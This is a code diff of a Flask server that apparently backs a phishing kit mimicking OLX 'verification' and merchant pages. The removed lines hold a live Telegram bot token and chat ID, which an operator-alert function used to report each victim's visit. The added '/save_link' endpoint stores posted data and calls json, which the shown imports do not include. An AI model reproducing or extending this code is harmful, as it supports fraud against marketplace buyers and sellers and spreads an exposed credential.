@@ -1,21 +1,9 @@
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
 import os
 import shutil
 from bs4 import BeautifulSoup
-import requests
 
 app = Flask(__name__)
-
-BOT_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
-CHAT_ID = '6958729639'
-
-def send_telegram_message(chat_id, text):
-    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-    payload = {'chat_id': chat_id, 'text': text}
-    response = requests.post(url, data=payload)
-    if response.status_code != 200:
-        print(f"Failed to send message: {response.text}")
-    return response
 
 @app.route('/verif/<random_id>', methods=['POST'])
 def save_page(random_id):
@@ -78,10 +66,34 @@ def save_page(random_id):
 @app.route('/merchant/<random_id>')
 def serve_merchant_page(random_id):
     merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
-    # Send a message to the user when they visit the link
-    response = send_telegram_message(CHAT_ID, f"Переход по ссылке {random_id}")
-    print(f"Message send response: {response.text}")
     return send_from_directory(merchant_path, 'index.html')
+
+@app.route('/save_link', methods=['POST'])
+def save_link():
+    data = request.json
+    if not data:
+        return jsonify({'error': 'No data provided'}), 400
+    
+    links_file_path = '/home/user/app/data/links.json'
+    
+    # Создаем директорию, если она не существует
+    os.makedirs(os.path.dirname(links_file_path), exist_ok=True)
+
+    # Загружаем существующие данные
+    if os.path.exists(links_file_path):
+        with open(links_file_path, 'r', encoding='utf-8') as file:
+            links = json.load(file)
+    else:
+        links = []
+
+    # Добавляем новые данные
+    links.append(data)
+    
+    # Сохраняем обновленные данные
+    with open(links_file_path, 'w', encoding='utf-8') as file:
+        json.dump(links, file, ensure_ascii=False, indent=4)
+    
+    return jsonify({'message': 'Link saved successfully'}), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
